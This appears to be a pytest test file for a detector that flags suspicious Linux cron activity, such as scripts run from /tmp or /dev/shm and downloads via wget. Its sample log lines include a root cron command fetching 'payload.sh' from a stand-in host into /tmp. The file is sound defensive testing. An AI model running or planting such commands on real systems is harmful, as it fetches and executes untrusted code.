from src.detection.linux.cron_activity_detector import (
    detect_suspicious_cron_activity,
)
from src.models.linux_event import LinuxEvent


def create_cron_event(
    message: str,
    hostname: str = "ubuntu-server",
) -> LinuxEvent:
    return LinuxEvent(
        timestamp="Jul  7 09:01:01",
        hostname=hostname,
        service="cron",
        process="CRON",
        pid="2301",
        message=message,
        action="cron_execute",
        status="success",
    )


def test_detect_cron_tmp_execution():
    events = [
        create_cron_event(
            "(root) CMD (/usr/bin/python3 /tmp/update.py)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1
    assert findings[0].title == "Suspicious Cron Activity Detected"
    assert findings[0].severity == "high"
    assert findings[0].hostname == "ubuntu-server"


def test_detect_cron_wget_download():
    events = [
        create_cron_event(
            "(root) CMD (wget http://example.test/payload.sh -O /tmp/a.sh)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1


def test_detect_cron_dev_shm_execution():
    events = [
        create_cron_event(
            "(root) CMD (/bin/sh /dev/shm/run.sh)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1


def test_ignore_normal_cron_activity():
    events = [
        create_cron_event(
            "(root) CMD (/usr/bin/updatedb)"
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert findings == []


def test_ignore_non_cron_event():
    events = [
        LinuxEvent(
            service="sudo",
            message="wget http://example.test/payload.sh",
            action="command",
            status="success",
        )
    ]

    findings = detect_suspicious_cron_activity(events)

    assert findings == []


def test_deduplicate_identical_cron_events():
    message = "(root) CMD (wget http://example.test/payload.sh -O /tmp/a.sh)"

    events = [
        create_cron_event(message),
        create_cron_event(message),
    ]

    findings = detect_suspicious_cron_activity(events)

    assert len(findings) == 1